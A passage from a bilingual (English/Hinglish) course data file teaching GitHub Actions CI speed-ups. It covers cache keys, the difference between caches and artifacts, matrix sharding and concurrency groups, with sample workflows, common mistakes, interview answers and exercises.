- **Dynamic matrices** — a setup job outputs a JSON array, a downstream job does \`matrix: \${{ fromJSON(needs.setup.outputs.list) }}\` to build the matrix at runtime (e.g. one job per changed service in a monorepo).

## Concurrency

A \`concurrency\` block ensures only one run per **group** proceeds at a time:

\`\`\`yaml
concurrency:
  group: \${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true
\`\`\`

With \`cancel-in-progress: true\`, when a new run starts for the same group (a new push to the same PR), the in-flight run is **cancelled**. This stops wasting runners on results nobody will look at because a newer commit already supersedes them. For deployment workflows you often want \`cancel-in-progress: false\` instead — you do not want to cancel a deploy that is halfway through — but still serialise so two deploys never run at once.

## Other speed levers

- **Parallelism by default** — jobs with no \`needs\` already run in parallel; make sure independent work is not artificially serialised.
- **Path filters** — \`on: { push: { paths-ignore: ['docs/**'] } }\` or \`dorny/paths-filter\` so a docs-only change skips the build entirely.
- **Right-sized runners** — a larger runner for a genuinely CPU-bound compile; the smallest that works for everything else.
- **Warm toolchains** — cache the compiler, the Docker layer cache (\`type=gha\`), the language runtime.
- **Do less** — only run integration tests on the paths that could affect them; only build the artifact once.`,

    contentHi: `## Speed ek correctness issue kyun hai

Ek CI pipeline jo bees minute leta hai sirf annoying nahi hai — ye behaviour badalta hai. Developers iske liye wait karna band kar dete hain, iske khatam hone se pehle merge karte hain, ya \`[skip ci]\` add karte hain. Unmein se har ek CI ka purpose defeat karta hai. Ek pipeline jo do ya teen minute mein return karta hai wo hai jise log actually ek feedback loop ke roop mein use karte hain.

## Caching

Ek **cache** ek slow, deterministic step ka result store karta hai taaki agla run ise skip kar sake. Archetype dependency installation hai: \`npm ci\`, \`pip install\` har run same packages fetch karte hain.

\`actions/cache\` ek **key** par kaam karta hai:
- **\`key\`** — ek exact-match identifier. Ye lagbhag hamesha **inputs ka ek hash** contain karta hai, \`hashFiles('**/package-lock.json')\` ke through.
- **\`restore-keys\`** — ordered fallback **prefixes**. Agar exact \`key\` miss hota hai, sabse recent cache jiski key ek restore-key prefix se shuru hoti hai restored hoti hai.
- Ek **hit** par, \`path\` restored hota hai. Ek **miss** par, step normally chalta hai, aur job ke end par \`path\` \`key\` ke tahat **saved** hota hai.

Do rules matter:
- Ek cache entry ek key ke liye likhne ke baad **immutable** hai. Isliye keys inputs ke hashes hain, static strings nahi.
- Caches ek **branch ke liye scoped** hain.

**Kabhi secrets ya kuch bhi cache mat karo jise ek attacker tamper kar sakta hai** — ek writable, shared cache ek supply-chain attack surface hai.

## Artifacts

Ek **artifact** ek file ya directory hai jise ek job **ek real output ke roop mein produce karta hai** aur jo later jobs ya ek human ke liye available hona chahiye.

**Build once** principle yahaan rehta hai: pipeline release artifact ko ek job mein build karta hai, ise upload karta hai, aur har downstream job *same* artifact download aur use karta hai.

### Cache versus artifact

| | cache | artifact |
|---|---|---|
| ye kya hai | ek speed optimisation | ek deliverable |
| agar missing hai | job phir bhi kaam karta hai, slower | downstream job breaks |
| keyed by | inputs ka ek hash | ek name jo aap chunte ho |
| lifetime | evicted | fixed retention |
| correct hona chahiye | nahi | haan |

## Matrix

Ek **matrix** ek job definition ko parameter values ke ek set par fan out karta hai. Common uses: compatibility (kai language/OS versions), test sharding (\`matrix: { shard: [1,2,3,4] }\`), dynamic matrices (\`fromJSON(needs.setup.outputs.list)\`).

## Concurrency

Ek \`concurrency\` block ensure karta hai ki per **group** ek saath sirf ek run proceed kare. \`cancel-in-progress: true\` ke saath, jab same group ke liye ek naya run start hota hai, in-flight run **cancel** hota hai.

## Other speed levers

Parallelism by default, path filters, right-sized runners, warm toolchains, do less.`,

    examples: [
      {
        title: 'Build once: the artifact built in one job reaches the deploy job byte-for-byte',
        titleHi: 'Build once: ek job mein bana artifact deploy job tak byte-for-byte pahunchta hai',
        code: `# VERIFY
exec 2>&1
export PATH="$HOME/bin:$PATH"
git init -q; git config user.email ci@example.com; git config user.name ci; git config core.autocrlf false
mkdir -p .github/workflows
cat > .github/workflows/ci.yml <<'YAML'
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir -p dist
          printf 'the compiled application - built exactly once\\n' > dist/app.js
          echo "BUILD  digest: $(sha256sum dist/app.js | cut -c1-12)"
      - uses: actions/upload-artifact@v4       # persist the deliverable
        with: { name: app-dist, path: dist/, retention-days: 7 }
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4     # pull the SAME bytes - do not rebuild
        with: { name: app-dist, path: dist/ }
      - run: 'echo "DEPLOY digest: $(sha256sum dist/app.js | cut -c1-12)  <- identical, never recompiled"'
YAML
git add -A >/dev/null; git commit -qm ci >/dev/null

actionlint -no-color 2>&1 | grep -E '\\.yml:' || echo "actionlint: no problems found"
act push -P ubuntu-latest=node:20-bullseye-slim --pull=false --artifact-server-path "$PWD/_a" 2>&1 \\
  | grep -oE '(BUILD|DEPLOY) +digest: [0-9a-f]{12}.*'`,
        output: `actionlint: no problems found
BUILD  digest: d5e8cec91764
DEPLOY digest: d5e8cec91764  <- identical, never recompiled`,
        explain: 'The build job compiles the application, producing a file, and uploads the containing directory as an artifact named app-dist. The deploy job, which needs build and therefore runs on a fresh machine after it, downloads that artifact and inspects the same file. Both jobs print a truncated SHA-256 of the file, and the two digests are identical, which proves that the deploy job is operating on the exact bytes the build job produced — nothing was recompiled, re-fetched, or regenerated in between. This is the build-once principle made concrete. In a real pipeline there would be more consumers of this artifact: an integration-test job, a staging deploy, a production deploy, each downloading the identical artifact, so that every environment runs the version that every test verified. The alternative — each job running its own build — would mean the tests validate one binary while production runs a different one built in a different job under possibly different conditions, which is the class of bug that "it passed CI but broke in prod" usually turns out to be.',
        explainHi: 'build job application compile karta hai, ek file produce karके, aur containing directory ko app-dist naam ke ek artifact ke roop mein upload karta hai. deploy job, jo build ke needs karta hai aur isliye iske baad ek fresh machine par chalta hai, us artifact ko download karta hai aur same file inspect karta hai. Dono jobs file ka ek truncated SHA-256 print karte hain, aur do digests identical hain, jo prove karta hai ki deploy job un exact bytes par operate kar raha hai jo build job ne produce kiye. Ye build-once principle concrete banaya. Ek real pipeline mein is artifact ke aur consumers honge: ek integration-test job, ek staging deploy, ek production deploy, har ek identical artifact download karke.',
      },
      {
        title: 'A matrix fans one test job out into parallel shards',
        titleHi: 'Ek matrix ek test job ko parallel shards mein fan out karta hai',
        code: `# VERIFY
exec 2>&1
export PATH="$HOME/bin:$PATH"
git init -q; git config user.email ci@example.com; git config user.name ci; git config core.autocrlf false
mkdir -p .github/workflows
cat > .github/workflows/ci.yml <<'YAML'
name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false          # one shard failing must not cancel the others
      max-parallel: 4
      matrix:
        shard: [1, 2, 3, 4]     # -> 4 parallel jobs, one per shard
    steps:
      - run: 'echo "shard \${{ matrix.shard }}/4  (would run: pytest --shard \${{ matrix.shard }}/4)"'
YAML
git add -A >/dev/null; git commit -qm ci >/dev/null

echo "--- actionlint ---"
actionlint -no-color 2>&1 | grep -E '\\.yml:' || echo "actionlint: no problems found"
echo "--- act: the one 'test' job expanded into 4 ---"
act push -P ubuntu-latest=node:20-bullseye-slim --pull=false 2>&1 \\
  | grep -oE 'shard [0-9]/4  \\(would run: pytest --shard [0-9]/4\\)' | sort -u`,
        output: `--- actionlint ---
actionlint: no problems found
--- act: the one 'test' job expanded into 4 ---
shard 1/4  (would run: pytest --shard 1/4)
shard 2/4  (would run: pytest --shard 2/4)
shard 3/4  (would run: pytest --shard 3/4)
shard 4/4  (would run: pytest --shard 4/4)`,
        explain: 'One job named test carries a strategy with a matrix over a shard parameter that takes four values. GitHub expands that single definition into four separate jobs, one for each value, and runs them in parallel on four runners; inside each, the matrix.shard expression resolves to that job\'s value. The output shows all four shards executing, each aware of which slice of the suite it owns. In a real setup the step would invoke the test runner with a sharding flag so shard one runs a quarter of the tests, shard two the next quarter, and so on, turning a ten-minute serial suite into roughly three minutes of wall-clock time. fail-fast is set to false so that if one shard fails, the other three still run to completion and report their results, rather than being cancelled the moment the first failure appears — which matters because you want to see every failure in one run, not discover them one shard at a time across several pushes. The same matrix mechanism, with different keys, tests one codebase against multiple language versions or operating systems.',
        explainHi: 'test naam ka ek job ek strategy carry karta hai ek matrix ke saath ek shard parameter par jo chaar values leta hai. GitHub us single definition ko chaar separate jobs mein expand karta hai, har value ke liye ek, aur unhe chaar runners par parallel mein chalata hai; har ek ke andar, matrix.shard expression us job ki value par resolve hota hai. Output saare chaar shards executing dikhaता hai, har ek aware ki wo suite ke kaunse slice ko own karta hai. Ek real setup mein step test runner ko ek sharding flag ke saath invoke karega. fail-fast false set hai taaki agar ek shard fail hota hai, baaki teen abhi bhi completion tak chalte hain.',
      },
    ],

    mistakes: [
      {
        wrong: `# a static cache key -> the cache is never invalidated when deps change
- uses: actions/cache@<sha>
  with:
    path: node_modules
    key: node-modules-cache          # <-- same key forever
- run: npm ci
# you bump a dependency in package.json. the cache key is unchanged, so CI restores the
# OLD node_modules, 'npm ci' sees them and (depending on the tool) may not fully reconcile.
# builds pass with stale/wrong dependency versions; prod gets a package CI never actually installed.`,
        right: `# key on a HASH of the lockfile, with a prefix restore-key for partial hits:
- uses: actions/cache@<sha>
  with:
    path: ~/.npm                                    # cache the DOWNLOAD cache, not node_modules
    key: npm-\${{ runner.os }}-\${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-\${{ runner.os }}-
- run: npm ci                                       # always runs; just faster on a hit
# now: change the lockfile -> new hash -> new key -> cache MISS -> fresh install -> new cache saved.
# (caching ~/.npm + always running 'npm ci' is safer than caching node_modules directly.)`,
        why: 'A cache is retrieved by its key, and a cache entry is immutable once written for a key, so a key that never changes will keep restoring the first thing that was ever stored under it. If that key is a fixed string like "node-modules-cache", then updating a dependency in the manifest does not change the key, CI restores the pre-update dependency tree, and the install step either skips work because the directory looks populated or partially reconciles it, depending on the package manager. The build then runs against dependency versions that do not match the lockfile, tests pass against the wrong code, and the artifact that ships contains packages that were never cleanly installed from the current manifest. The fix is to make the key a function of the inputs that determine the cached content — a hash of the lockfile via hashFiles — so any change to dependencies produces a new key, forces a cache miss, and triggers a fresh install whose result is saved under the new key. A prefix restore-key gives a partial hit when only some dependencies changed. Caching the package manager\'s download directory rather than the installed modules, and always running the real install step, is more robust than trying to cache the final node_modules directly.',
        whyHi: 'Ek cache apni key se retrieve hota hai, aur ek cache entry ek key ke liye likhne ke baad immutable hai, to ek key jo kabhi nahi badalti pehli cheez restore karti rahegi jo kabhi us key ke tahat stored thi. Agar wo key ek fixed string hai jaise "node-modules-cache", to manifest mein ek dependency update karna key nahi badalta, CI pre-update dependency tree restore karta hai, aur install step ya to kaam skip karta hai kyunki directory populated dikhती hai. Build phir dependency versions ke against chalta hai jo lockfile se match nahi karte. Fix key ko un inputs ka ek function banana hai jo cached content determine karte hain — lockfile ka ek hash \`hashFiles\` ke through.',
      },
      {
        wrong: `# using a cache where you needed an artifact
- run: npm run build          # produces dist/
- uses: actions/cache@<sha>
  with: { path: dist, key: build-\${{ github.sha }} }
# ...deploy job:
- uses: actions/cache@<sha>
  with: { path: dist, key: build-\${{ github.sha }} }
- run: aws s3 sync dist/ s3://prod
# if the cache was evicted (size cap, LRU) between the build job and the deploy job, 'dist/'
# is EMPTY and you deploy nothing. a cache is allowed to vanish; a deployable must not.`,
        right: `# the build output is a DELIVERABLE -> artifact, not cache:
# build job:
- run: npm run build
- uses: actions/upload-artifact@<sha>
  with: { name: dist, path: dist/ }
# deploy job:
- uses: actions/download-artifact@<sha>
  with: { name: dist }
- run: aws s3 sync dist/ s3://prod
# rule of thumb: losing it only slows the pipeline -> cache. losing it BREAKS the pipeline -> artifact.
# (caches are also branch-scoped and size-capped; artifacts are named, retained, and downloadable.)`,
        why: 'A cache and an artifact are delivered by superficially similar actions but have opposite guarantees. A cache is an optimisation that the platform is free to evict at any time — under a size cap, by least-recently-used policy, after an idle period — because the assumption is that its contents can always be regenerated by rerunning the step that produced them. An artifact is a named output that is retained for a defined period and is expected to be there. Using a cache to carry a build output from one job to another therefore introduces a failure mode where the build succeeds, the cache is evicted before the deploy job runs, the deploy job restores nothing, and the deployment proceeds with an empty directory, shipping nothing or a broken partial. The correct mechanism for anything that a later job or a human genuinely needs to retrieve is upload-artifact and download-artifact. The distinguishing question is what happens if the thing disappears: if the pipeline merely gets slower, it was a cache; if the pipeline breaks, it was an artifact and must be stored as one.',
        whyHi: 'Ek cache aur ek artifact superficially similar actions dwara delivered hote hain par opposite guarantees hain. Ek cache ek optimisation hai jise platform kisi bhi samay evict karne ke liye free hai — ek size cap ke tahat, least-recently-used policy se — kyunki assumption ye hai ki iska content hamesha regenerate ho sakta hai. Ek artifact ek named output hai jo ek defined period ke liye retained hai. Ek cache use karके ek build output ko ek job se doosre mein carry karna isliye ek failure mode introduce karta hai jahan build succeed karta hai, cache deploy job ke chalne se pehle evicted hota hai, deploy job kuch restore nahi karta. Distinguishing question ye hai ki agar cheez gायab ho jaaye to kya hota hai.',
      },
      {
        wrong: `# no concurrency control -> every push to a PR runs a full pipeline to completion
# a dev pushes 6 quick fixups to their PR in 10 minutes.
# result: 6 concurrent pipeline runs, 5 of them for commits nobody will ever look at
# again, all consuming runner minutes and holding up the queue for other PRs.
# and for a DEPLOY workflow with no concurrency: two deploys can interleave -> chaos.`,
        right: `# CI workflow: cancel superseded runs of the same ref
concurrency:
  group: \${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true      # a new push to the PR kills the now-stale run

# DEPLOY workflow: serialise, but do NOT cancel a deploy in flight
concurrency:
  group: deploy-\${{ github.ref }}
  cancel-in-progress: false     # queue the next deploy; never interrupt a running one`,
        why: 'Without a concurrency group, each triggering event starts an independent run and all of them proceed in parallel to completion. On an actively developed pull request, where a developer may push several small corrections in quick succession, this produces a stack of simultaneous pipeline runs, most of them evaluating commits that have already been superseded and whose results no one will act on, while consuming the shared pool of runners and delaying feedback for every other pull request. Declaring a concurrency group keyed on the workflow and the ref, with cancel-in-progress enabled, means a new push to the same branch cancels the run that is now stale, so only the latest commit is being evaluated at any time. Deployment workflows want the same serialisation for a different reason — two deployments of the same service must never run at once — but there cancel-in-progress should be false, because interrupting a deployment that is partway through applying changes can leave the target in an inconsistent state; instead the next deployment queues and starts when the current one finishes.',
        whyHi: 'Ek concurrency group ke bina, har triggering event ek independent run start karta hai aur wo sab parallel mein completion tak proceed karte hain. Ek actively developed pull request par, jahan ek developer quick succession mein kai chhote corrections push kar sakta hai, ye simultaneous pipeline runs ka ek stack produce karta hai, unmein se zyadaatar commits evaluate karte hue jo already superseded hain. Workflow aur ref par keyed ek concurrency group declare karna, cancel-in-progress enabled ke saath, matlab same branch ka ek naya push us run ko cancel karta hai jo ab stale hai. Deployment workflows same serialisation chahte hain ek alag reason ke liye — same service ke do deployments kabhi ek saath nahi chalne chahiye — par wahan cancel-in-progress false hona chahiye.',
      },
    ],

    realWorld: [
      {
        en: '**A cache key of `deps-v1` shipped a security-patched dependency that was never installed** — the lockfile was bumped but the static key kept restoring the old `node_modules`. Switched the key to `hashFiles(\'**/package-lock.json\')`; the next build correctly missed, installed the patch, and saved a new cache.',
        hi: '**`deps-v1` ki ek cache key ne ek security-patched dependency ship ki jo kabhi install nahi hui** — lockfile bump hua par static key purana `node_modules` restore karti rahi. Key ko `hashFiles(\'**/package-lock.json\')` par switch kiya.',
      },
      {
        en: '**A staging deploy pushed an empty `dist/`** — the build job stored the output as a *cache* keyed on the SHA, and the cache had been evicted (size cap) by the time the deploy job ran an hour later. Moved to `upload-artifact`/`download-artifact`; the empty deploys stopped.',
        hi: '**Ek staging deploy ne ek empty `dist/` push kiya** — build job ne output ko SHA par keyed ek *cache* ke roop mein store kiya, aur cache evict ho gaya tha. `upload-artifact`/`download-artifact` par move kiya.',
      },
      {
        en: '**A 22-minute test suite became 4 minutes** — split into 6 shards with `matrix: { shard: [1..6] }` + `fail-fast: false` and the runner\'s `--shard` flag. Same total compute, six parallel runners, and every failure visible in one run.',
        hi: '**Ek 22-minute test suite 4 minute ban gayi** — `matrix: { shard: [1..6] }` + `fail-fast: false` ke saath 6 shards mein split kiya.',
      },
    ],

    interviewQA: [
      {
        q: 'What is the difference between a cache and an artifact in a CI pipeline, and how do you choose?',
        qHi: 'Ek CI pipeline mein ek cache aur ek artifact mein kya farak hai?',
        a: 'They are delivered by similar-looking actions but have opposite guarantees. A cache is a speed optimisation: it stores the result of a slow deterministic step, such as dependency installation or compiler output, so a later run can skip the work. It is identified by a key, usually a hash of the inputs that determine its contents, and the platform is free to evict it at any time under a size cap or a least-recently-used policy, because the assumption is that its contents can always be regenerated. If a cache is missing, the job still works, just slower. An artifact is a deliverable: a file or directory that a job produces as a real output and that a later job or a human genuinely needs. It is identified by a name you choose, retained for a defined period, and downloadable from the run. If an artifact is missing, the downstream job breaks. The choice follows directly from what happens if the thing disappears. If losing it only makes the pipeline slower, it is a cache. If losing it breaks the pipeline, it is an artifact. So dependency download directories and Docker layer caches are caches; the compiled application that the deploy job needs, a coverage report, a packaged binary are artifacts. Using a cache where you needed an artifact creates a failure where an eviction between the build job and the deploy job leaves the deploy with nothing.',
        aHi: 'Wo similar-looking actions dwara delivered hote hain par opposite guarantees hain. Ek cache ek speed optimisation hai: ye ek slow deterministic step ka result store karta hai. Ye ek key se identified hota hai, usually un inputs ka ek hash jo iska content determine karte hain, aur platform ise kisi bhi samay evict karne ke liye free hai. Agar ek cache missing hai, job phir bhi kaam karta hai, bas slower. Ek artifact ek deliverable hai: ek file ya directory jise ek job ek real output ke roop mein produce karta hai. Agar ek artifact missing hai, downstream job breaks. Choice directly follow karta hai ki agar cheez gायab ho jaaye to kya hota hai. Agar ise khona sirf pipeline ko slower banata hai, ye ek cache hai. Agar ise khona pipeline ko todता hai, ye ek artifact hai.',
      },
      {
        q: 'How would you take a 20-minute CI pipeline down to a few minutes?',
        qHi: 'Aap ek 20-minute CI pipeline ko kuch minute tak kaise laoge?',
        a: 'First, measure which stages actually take the time. Then apply the levers. Cache the slow deterministic steps: dependency installation keyed on a hash of the lockfile with a prefix restore-key, the compiler or build cache, and the Docker layer cache. Split the long test suites with a matrix on a shard parameter and the runner\'s sharding flag, with fail-fast false so every failure shows in one run — a ten-minute suite in four shards returns in about three minutes on four runners. Make sure independent jobs actually run in parallel and are not serialised by unnecessary needs edges, and order the pipeline fail-fast so the cheap checks gate the expensive ones. Build the release artifact exactly once and have every downstream job download it rather than rebuilding. Add path filters so a docs-only or unrelated change skips the build. Add a concurrency group with cancel-in-progress so pushes to an active pull request cancel their own stale runs instead of piling up. Consider a larger runner for a genuinely CPU-bound compile step. And reduce the work itself where possible — only run the integration tests affected by the change. The combination of caching, sharding, real parallelism, and building once is usually what turns twenty minutes into three or four.',
        aHi: 'Pehle, measure karo ki kaunse stages actually samay lete hain. Phir levers apply karo. Slow deterministic steps cache karo: dependency installation lockfile ke ek hash par keyed, compiler ya build cache, aur Docker layer cache. Lambe test suites ko ek shard parameter par ek matrix se split karo, fail-fast false ke saath. Ensure karo ki independent jobs actually parallel mein chalte hain. Release artifact ko theek ek baar build karo aur har downstream job ise download kare. Path filters add karo. Ek concurrency group cancel-in-progress ke saath add karo. Caching, sharding, real parallelism, aur ek baar build karne ka combination usually wo hai jo bees minute ko teen ya chaar mein badalta hai.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain how `actions/cache` keys work (`key`, `restore-keys`, hit/miss, immutability, branch scope) and why the key must be a hash of the inputs.',
        taskHi: 'Ek comment mein, samjhao ki `actions/cache` keys kaise kaam karti hain.',
        hint: '`actions/cache` restores `path` by matching `key`. `key` = an EXACT-match identifier that should contain a HASH OF THE INPUTS — `hashFiles(\'**/package-lock.json\')` — so it changes ONLY when the cached content should. `restore-keys` = ordered fallback PREFIXES: if the exact `key` misses, the most recent cache whose key starts with a restore-key is restored (a PARTIAL hit — usually still a big win). HIT → `path` restored, skip the slow step. MISS → the step runs normally, and AT THE END OF THE JOB `path` is SAVED under `key`. TWO RULES: (1) a cache entry is IMMUTABLE once written for a key — you can\'t update `key=abc`, you write a NEW key. So a STATIC key (`deps-v1`) restores the FIRST thing ever stored under it FOREVER → bump a dependency, key unchanged, CI restores the OLD `node_modules`, the install step under-reconciles → build passes with stale/wrong versions, prod gets a package CI never cleanly installed. A hash key: change the lockfile → new hash → new key → MISS → fresh install → new cache saved. (2) caches are BRANCH-SCOPED — a branch reads its own caches + its base branch\'s, not unrelated branches (stops cross-branch poisoning). NEVER cache secrets or anything an attacker could tamper with — a shared writable cache is a supply-chain attack surface (a poisoned `node_modules` cache runs on every later build). Safer pattern: cache the download dir (`~/.npm`) + ALWAYS run the real `npm ci`, rather than caching `node_modules` directly.',
        hintHi: '`actions/cache` `path` ko `key` match karके restore karta hai. `key` = ek EXACT-match identifier jismein INPUTS KA HASH hona chahiye — `hashFiles(\'**/package-lock.json\')` — taaki ye SIRF tab badle jab cached content badalna chahiye. `restore-keys` = ordered fallback PREFIXES. HIT → `path` restored, slow step skip. MISS → step normally chalta hai, aur JOB KE END par `path` `key` ke tahat SAVED. DO RULES: (1) ek cache entry ek key ke liye IMMUTABLE hai — ek STATIC key (`deps-v1`) HAMESHA pehli cheez restore karti hai → ek dependency bump karo, key unchanged, CI PURANA `node_modules` restore karta hai → build stale versions ke saath pass hota hai. (2) caches BRANCH-SCOPED hain. KABHI secrets cache mat karo. Safer: download dir (`~/.npm`) cache karo + HAMESHA real `npm ci` chalao.',
      },
      {
        task: 'In a comment, contrast cache vs artifact across purpose, missing-behaviour, identifier, lifetime and correctness, and give the one-question test.',
        taskHi: 'Ek comment mein, cache vs artifact ka contrast karo.',
        hint: 'Similar-looking actions, OPPOSITE guarantees. CACHE = a SPEED optimisation storing a rebuildable slow step (deps install, compiler/build cache, Docker layer cache). ARTIFACT = a DELIVERABLE — a real output a later job or a human needs (the compiled app, a coverage report, a packaged binary). IF IT\'S MISSING: cache → the job still works, just slower; artifact → the downstream job is BROKEN. IDENTIFIED BY: cache → a `key` (usually a hash of inputs); artifact → a `name` you choose. LIFETIME: cache → EVICTED freely (LRU, size cap, ~7-day idle); artifact → FIXED retention (default 90d), downloadable from the run page. MUST IT BE CORRECT: cache → NO, safe to lose + regenerate; artifact → YES, it\'s what you ship. THE TEST: "what happens if this disappears?" — pipeline just gets SLOWER → it\'s a cache; pipeline BREAKS → it\'s an artifact, store it as one. FAILURE MODE of getting it wrong: storing `dist/` as a cache keyed on the SHA → the cache is evicted between the build job and the deploy job an hour later → deploy restores NOTHING → ships an empty/broken `dist/`. BUILD-ONCE (Lessons 1 & 5) lives in the artifact: build the release artifact in ONE job, every downstream job (integration tests, staging deploy, prod deploy) downloads the SAME bytes → prod runs byte-for-byte what every test verified.',
        hintHi: 'Similar-looking actions, OPPOSITE guarantees. CACHE = ek SPEED optimisation jo ek rebuildable slow step store karta hai. ARTIFACT = ek DELIVERABLE — ek real output jo ek later job ya human ko chahiye. AGAR MISSING HAI: cache → job phir bhi kaam karta hai, bas slower; artifact → downstream job BROKEN hai. IDENTIFIED BY: cache → ek `key`; artifact → ek `name`. LIFETIME: cache → freely EVICTED; artifact → FIXED retention. THE TEST: "agar ye gायab ho jaaye to kya hota hai?" — pipeline bas SLOWER → cache; pipeline BREAKS → artifact. FAILURE MODE: `dist/` ko SHA par keyed cache ke roop mein store karna → cache evicted → deploy KUCH NAHI restore karta → empty `dist/` ship. BUILD-ONCE artifact mein rehta hai.',
      },
      {
        task: 'In a comment, explain the matrix strategy (fan-out, `fail-fast`, `include`/`exclude`, sharding, dynamic matrices) and the concurrency block (CI vs deploy settings).',
        taskHi: 'Ek comment mein, matrix strategy aur concurrency block samjhao.',
        hint: 'MATRIX fans ONE job definition out over parameter values → one job PER COMBINATION, IN PARALLEL; inside each, `${{ matrix.<key> }}` resolves to that job\'s value. `strategy.matrix: { os: [ubuntu, windows], node: [18,20,22] }` → 2×3 = 6 jobs. `fail-fast` (default TRUE = one failure cancels the siblings; set FALSE for sharding so every failure shows in ONE run). `max-parallel` caps concurrent matrix jobs. `include:` adds combinations or extra keys to existing ones; `exclude:` removes specific ones. USES: (1) COMPATIBILITY — one codebase vs multiple language/OS versions; (2) TEST SHARDING — `matrix: { shard: [1,2,3,4] }` + the runner\'s `--shard ${{ matrix.shard }}/4` → a 10-min suite in 4 shards ≈ 3 min on 4 runners; (3) DYNAMIC — a setup job outputs a JSON array, a downstream job does `matrix: ${{ fromJSON(needs.setup.outputs.list) }}` → build the matrix at runtime (e.g. one job per changed service in a monorepo). CONCURRENCY: `concurrency: { group: <expr>, cancel-in-progress: <bool> }` → only one run per GROUP proceeds. CI workflow: `group: ${{ github.workflow }}-${{ github.ref }}`, `cancel-in-progress: true` → a new push to a PR KILLS the now-stale run (stops 6 fixups → 6 parallel wasted runs). DEPLOY workflow: `group: deploy-${{ github.ref }}`, `cancel-in-progress: FALSE` → serialise so two deploys never interleave, but NEVER interrupt a deploy that\'s partway through applying changes (queue the next one instead).',
        hintHi: 'MATRIX EK job definition ko parameter values par fan out karta hai → PER COMBINATION ek job, PARALLEL mein. `fail-fast` (default TRUE = ek failure siblings cancel karta hai; sharding ke liye FALSE). `include:`/`exclude:`. USES: (1) COMPATIBILITY; (2) TEST SHARDING — `matrix: { shard: [1,2,3,4] }` + `--shard` → 10-min suite ≈ 3 min; (3) DYNAMIC — `matrix: ${{ fromJSON(needs.setup.outputs.list) }}`. CONCURRENCY: `{ group: <expr>, cancel-in-progress: <bool> }` → per GROUP ek run. CI: `cancel-in-progress: true` → naya push stale run KILL karta hai. DEPLOY: `cancel-in-progress: FALSE` → serialise par ek running deploy KABHI interrupt mat karo.',
      },
    ],

    keyTakeaways: [
      'A SLOW PIPELINE IS A CORRECTNESS ISSUE — devs stop waiting, merge early, batch pushes, add `[skip ci]`. FOUR LEVERS: cache the deterministic slow steps, build the artifact ONCE and pass it downstream, run independent work in parallel via a MATRIX, and CANCEL superseded runs.',
      '`actions/cache`: `key` = an EXACT-match id that must contain a HASH OF INPUTS (`hashFiles(\'**/package-lock.json\')`) so it changes only when the content should; `restore-keys` = ordered fallback PREFIXES for a partial hit. HIT → restore, skip the slow step; MISS → run it, then SAVE `path` under `key` at job end. A cache entry is IMMUTABLE per key (a STATIC key restores the first thing forever → stale deps ship), and BRANCH-SCOPED. NEVER cache secrets / tamperable inputs (a poisoned cache = supply-chain risk). Prefer caching `~/.npm` + always running `npm ci` over caching `node_modules`.',
      'CACHE vs ARTIFACT (similar actions, OPPOSITE guarantees): cache = a SPEED optimisation, keyed by an input hash, freely EVICTED, job still works without it. Artifact = a DELIVERABLE, named, FIXED retention (default 90d), downloadable, the downstream job BREAKS without it. THE TEST: disappears → pipeline just slower = cache; pipeline breaks = artifact. BUILD ONCE lives here — one build job uploads the release artifact, every downstream job (tests, staging, prod) downloads the SAME bytes.',
      'MATRIX fans ONE job out over parameter values → one PARALLEL job per combination, `${{ matrix.<key> }}` differs in each. `fail-fast` (default true; set FALSE for sharding so every failure shows in one run), `max-parallel`, `include`/`exclude`. Uses: multi-version/OS COMPATIBILITY, TEST SHARDING (`shard: [1,2,3,4]` + the runner\'s `--shard N/4` → a 10-min suite ≈ 3 min), and DYNAMIC matrices via `fromJSON(needs.setup.outputs.list)`.',
      'CONCURRENCY: `concurrency: { group: <expr>, cancel-in-progress: <bool> }` → one run per group. CI workflow: `group: ${{ github.workflow }}-${{ github.ref }}` + `cancel-in-progress: true` → a new push to a PR kills the now-stale run (no pile-up of runs for superseded commits). DEPLOY workflow: `cancel-in-progress: FALSE` → serialise so two deploys never interleave, but NEVER interrupt a deploy mid-apply. OTHER WINS: real parallelism (no needless `needs`), path filters (docs-only change skips the build), right-sized runners, warm toolchains (Docker layer cache `type=gha`), run only the affected tests.',
    ],
    keyTakeawaysHi: [
      'EK SLOW PIPELINE EK CORRECTNESS ISSUE HAI — devs wait karna band karte hain, jaldi merge, `[skip ci]` add. CHAAR LEVERS: deterministic slow steps cache karo, artifact ek BAAR build karo aur downstream pass karo, independent kaam ek MATRIX se parallel mein chalao, superseded runs CANCEL karo.',
      '`actions/cache`: `key` = ek EXACT-match id jismein INPUTS KA HASH hona chahiye (`hashFiles(...)`); `restore-keys` = fallback PREFIXES. HIT → restore, slow step skip; MISS → chalao, phir job end par `path` `key` ke tahat SAVE. Ek cache entry per key IMMUTABLE hai (ek STATIC key hamesha pehli cheez restore karti hai → stale deps ship), aur BRANCH-SCOPED. KABHI secrets cache mat karo.',
      'CACHE vs ARTIFACT (similar actions, OPPOSITE guarantees): cache = ek SPEED optimisation, input hash se keyed, freely EVICTED. Artifact = ek DELIVERABLE, named, FIXED retention, downloadable, downstream job iske bina BREAKS. THE TEST: gायab → pipeline bas slower = cache; pipeline breaks = artifact. BUILD ONCE yahaan rehta hai.',
      'MATRIX EK job ko parameter values par fan out karta hai → per combination ek PARALLEL job. `fail-fast` (default true; sharding ke liye FALSE), `include`/`exclude`. Uses: multi-version/OS COMPATIBILITY, TEST SHARDING (`shard: [1,2,3,4]` + `--shard N/4` → 10-min suite ≈ 3 min), DYNAMIC matrices `fromJSON(...)` se.',
      'CONCURRENCY: `{ group: <expr>, cancel-in-progress: <bool> }` → per group ek run. CI: `cancel-in-progress: true` → PR ka naya push stale run kill karta hai. DEPLOY: `cancel-in-progress: FALSE` → serialise par ek running deploy KABHI interrupt mat karo. OTHER WINS: real parallelism, path filters, right-sized runners, warm toolchains.',
    ],
  },
];
